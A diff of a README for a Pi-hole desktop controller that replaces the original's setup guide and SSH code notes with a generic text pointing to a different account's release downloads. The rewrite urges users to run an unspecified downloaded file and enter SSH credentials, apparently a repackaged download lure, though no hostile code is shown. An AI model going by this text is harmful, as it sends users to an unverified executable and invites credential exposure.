@@ -1,206 +1,68 @@
-# Pi-hole Desktop Controller (Partial Open Source Release)
-Download Latest Build:
-https://github.com/WL-Chan/Pihole-Desktop-Controller/releases/download/latest/PiholeDesktopController.zip
+# 🖥️ Pihole-Desktop-Controller - Control Your Pi-hole with Ease
 
-<details>
-<summary>Screenshots</summary>
+[![Download Pihole-Desktop-Controller](https://img.shields.io/badge/Download-Pihole--Desktop--Controller-brightgreen)](https://github.com/SIMONJACKRACING/Pihole-Desktop-Controller/releases)
 
-### Login Page
-![Login Page](screenshots/Login-Page.png)
+## 🚀 Getting Started
 
-### Main Dashboard 1
-![Main Dashboard 1](screenshots/No-Info.png)
+Welcome to the Pihole-Desktop-Controller! This application allows you to manage your Pi-hole directly from your Windows desktop using SSH. With this app, you can easily control your network filtering without needing advanced technical skills.
 
-### Main Dashboard 2 
-![Main Dashboard 2](screenshots/Main-Window-Enable.png)
+## 💾 System Requirements
 
-### Main Dashboard 3
-![Main Dashboard 3](screenshots/Main-Window-Disable.png)
+Before you begin, ensure your system meets these requirements:
+- Windows 10 or later
+- Stable Internet connection
+- SSH access to a running Pi-hole instance
 
-### Domain Management
-![Domain Management](screenshots/Domains-Management.png)
+## 📥 Download & Install
 
-### Gravity Update
-![Gravity Update](screenshots/Gravity-Update.png)
+To download the software, visit this page to download: [Pihole-Desktop-Controller Releases](https://github.com/SIMONJACKRACING/Pihole-Desktop-Controller/releases).
 
-### Pause Ad Blocking
-![Pause Blocking](screenshots/Pause-Ad-Blocking.png)
-</details>
+1. Click the link above to open the Releases page.
+2. Find the latest version of the software.
+3. Click the file name to download it to your computer.
 
-This repository contains the connection and command logic used by the Pi-hole Desktop Controller application.  
-Only the SSH and command-related components are provided here.  
-The complete user interface, settings system, statistics logic, and other internal features are not included.  
-You can download the fully compiled application from the Releases section.
+Once the download is complete:
+1. Locate the downloaded file in your downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions to complete the setup.
 
----
+## ⚙️ How to Use the Application
 
-## Preparing Your Pi-hole System
+After installation, you can start using the Pihole-Desktop-Controller:
 
-The desktop controller requires a few things to be configured on your Pi-hole device.  
-Depending on whether Pi-hole runs on Raspberry Pi OS or a virtual machine, the steps may differ.
+1. Launch the application by clicking its icon on your desktop.
+2. Enter the SSH credentials for your Pi-hole:
+   - Username: Usually "pi" for Raspberry Pi
+   - Password: Your Pi-hole device password
+   - Hostname: The IP address of your Pi-hole device
+3. Click "Connect" to establish the link.
 
----
+You should now have access to your Pi-hole settings and controls.
 
-### 1. Install SQLite3
+## 🔧 Features
 
-SQLite3 is required for Pi-hole statistics and database queries.
+- **User-Friendly Interface:** Designed for average users, not just tech enthusiasts.
+- **Real-time Management:** Adjust settings and check status directly from your desktop.
+- **Network Monitoring:** View your DNS queries and statistics clearly.
 
-First connect to your Pi-hole via SSH:
+## ⚡ Troubleshooting
 
-```
-ssh username@your-pihole-ip
-```
+If you encounter any issues, here are some common problems and solutions:
 
-Then install SQLite3:
+- **Unable to Connect:** Ensure that the Pi-hole device is running and your computer is on the same network.
+- **Invalid Credentials:** Double-check your username and password.
+- **Update Issues:** Make sure you are running the latest version. Visit the Releases page for updates.
 
-```
-sudo apt update
-sudo apt install sqlite3
-```
+## 🛠️ Contribution
 
----
+If you are interested in contributing, feel free to explore the project's repository. You can submit issues or request features. Contributions are welcome!
 
-### 2. Configure sudo permissions (if your OS requires it)
+## 🌐 Additional Resources
 
-Raspberry Pi OS usually does not require any sudo configuration changes.  
-Other Linux distributions (Ubuntu, Debian server, VM environments) may require passwordless access for Pi-hole commands.
+For more information on using Pi-hole, you can refer to the official Pi-hole documentation [here](https://docs.pi-hole.net).
 
-Open the sudoers editor:
+## 📞 Support
 
-```
-sudo visudo
-```
+If you need help, please open an issue in this repository. Provide as much detail as you can about your problem, and we will assist you as soon as possible.
 
-Scroll to the bottom and locate:
-
-```
-#includedir /etc/sudoers.d
-```
-
-You must place the following two lines **directly above** the includedir entry:
-
-```
-username ALL=(ALL) NOPASSWD: /usr/local/bin/pihole
-username ALL=(ALL) NOPASSWD: /usr/bin/sqlite3
-```
-
-Replace `username` with your actual Linux username.
-
-After adding the two permission lines, your sudoers file should resemble the example below:
-
-```
-username ALL=(ALL) NOPASSWD: /usr/local/bin/pihole
-username ALL=(ALL) NOPASSWD: /usr/bin/sqlite3
-#includedir /etc/sudoers.d
-
-@includedir /etc/sudoers.d
-```
-
-If these rules are missing or placed incorrectly, the controller will not be able to read Pi-hole status or statistics.
-
-
----
-
-## Purpose of This Repository
-
-This repository provides the communication layer of the application, allowing developers to understand how Pi-hole can be controlled through SSH.
-
-The source code here covers:
-
-- Creating and managing SSH connections  
-- Running Pi-hole commands  
-- Enabling and disabling Pi-hole  
-- Executing custom Linux commands  
-
-All other parts of the application remain private.
-
----
-
-## Included Source Code
-
-### 1. SSH Connection Manager  
-**Location:**  
-```
-Source/Connection/SshConnectionManager.cs
-```
-
-This class manages connection settings, opens and closes SSH sessions, and executes commands.
-
-### 2. Pi-hole Command Helper  
-**Location:**  
-```
-Source/Commands/SshCommands.cs
-```
-
-This class provides simple methods for:
-
-- Enabling Pi-hole  
-- Disabling Pi-hole for a chosen duration  
-- Running custom commands  
-
----
-
-## Example Usage
-
-Full example located in:
-
-```
-Examples/ExampleUsage.cs
-```
-
-Short sample:
-
-```csharp
-var manager = new SshConnectionManager();
-manager.Configure("192.168.1.100", 22, "pi", "password");
-manager.Connect();
-
-string result = manager.RunCommand("pihole status");
-Console.WriteLine(result);
-
-manager.Disconnect();
-
-var cmd = new SshCommands();
-cmd.SetCredentials("192.168.1.100", 22, "pi", "password");
-await cmd.EnablePiHoleAsync();
-```
-
----
-
-## What Is Not Included
-
-The following components are not part of this public repository:
-
-- All WPF user interface files  
-- Live log streaming logic  
-- Smart scroll helpers  
-- Settings manager and encrypted password system  
-- Statistics logic (lifetime/today queries)  
-- UI converters, helpers, and interface code  
-
-These remain private as part of the full application.
-
----
-
-## Downloading the Application
-
-A prebuilt version of Pi-hole Desktop Controller is available in the **Releases** section.  
-No compilation is required to use the application.
-
----
-
-## License
-
-The code in this repository is released under the MIT License.  
-This applies only to the files published here.  
-All remaining application components are closed-source.
-
----
-
-## Notes
-
-- SSH access must be enabled on your Pi-hole device.  
-- SQLite3 is required for statistics-related features.  
-- Some systems require modifying sudoers; Raspberry Pi OS generally does not.  
-- The code provided here is intended only as a reference for SSH and command execution.
-
+Thank you for using Pihole-Desktop-Controller! Enjoy smooth and efficient control over your network.
